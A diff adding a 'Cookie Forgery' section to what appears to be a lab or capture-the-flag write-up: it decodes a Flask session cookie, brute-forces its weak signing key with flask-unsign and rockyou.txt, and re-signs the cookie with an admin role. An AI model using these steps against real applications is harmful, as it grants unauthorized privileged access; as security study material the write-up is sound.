@@ -122,6 +122,57 @@ session=<Redacted>
 - now we can set this cookie in our browser and have priviliged access
 
 
+### Cookie Forgery
+---
+>[!Tip]
+> the secret-key is maybe not so secret 
+
+- when we first visit the home page, we can see in the browser developer tools that a `cookie` is set 
+- when we navigate to `dashboard` we can see this message: `only the admin or staff can visit that page` 
+
+- the `cookie` looks like this: 
+```html
+eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ.adbKoA.6pU_0FgjOogKLnNrQiHCio-UkFA
+```
+
+- the Flask session cookie is divided in 3 parts and is `Base64` encoded 
+- the first part: `eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ` stores the data from the `cookie` 
+- the second part: `adbKoA` is a timestamp (Unix time) used by Flask to validate the session
+- the third part: `6pU_0FgjOogKLnNrQiHCio-UkFA` is a signature, that is protecting the `cookie` from manipulation 
+- Flask stores session data client-side and protects it using a signature  
+- if the `secret-key` is weak, the signature can be brute-forced  
+- this allows attackers to modify the session data and re-sign it
+
+- when we decode the first part of the `cookie`, we can see this: 
+```json
+{"mode":"unsecure","role":"guest"}
+```
+- so when we can brute-force the `secret-key` we could craft a new `cookie` with the role: `admin` 
+
+- we can try it with the tool: `flask-unsign`: 
+```bash
+flask-unsign --unsign --cookie "eyJtb2RlIjoidW5zZWN1cmUiLCJyb2xlIjoiZ3Vlc3QifQ.adbKoA.6pU_0FgjOogKLnNrQiHCio-UkFA" --wordlist /usr/share/rockyou.txt --no-literal-eval
+```
+- to brute-force it we have to give it a `wordlist` and I decided to use `rockyou.txt` 
+
+- and we got a hit:
+```bash
+[*] Session decodes to: {'mode': 'unsecure', 'role': 'guest'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 128 attempts
+b'<Redacted>'
+```
+
+- now we can craft a new `cookie` with `flask-usign`: 
+```bash
+flask-unsign --sign --cookie '{"mode":"unsecure","role":"admin"}' --secret '<Redacted>'
+```
+
+- after this we can set the `cookie` in our Browser and get `admin` priviliges 
+
+
+
+
 ### User Enumeration + Brute Force
 ---
 
